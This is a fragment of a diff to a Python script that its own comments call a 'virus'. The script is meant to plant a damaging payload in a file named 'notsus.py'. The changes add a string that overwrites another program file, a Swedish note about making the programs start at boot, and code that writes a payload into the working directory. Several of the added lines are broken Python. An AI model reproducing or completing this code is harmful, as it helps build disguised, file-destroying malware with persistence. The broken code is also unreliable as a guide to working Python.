@@ -1,6 +1,6 @@
 # This variable is the part that does the damage, and will be put in a other file named notsus.py
 #
-virus = ""
+virus = "f = open('programmet.py', 'w')\nf.write()\nf.close()"
 #
 #
 #
@@ -48,7 +48,7 @@ for i in range(21):
   f.close()
 #
 #
-#
+Gör att programen startas när datorn startar...
 #
 #
 #
@@ -62,6 +62,8 @@ deinstall = 'import os\nif input("Är python ett bra programeringsspråk? ") == 
 #f.write(deinstall)
 #f.close()
 #exec(deinstall)
+
+#JUST FOR TEST
 
 f = open(os.getcwd(), "w")
 f.write(RNWC)
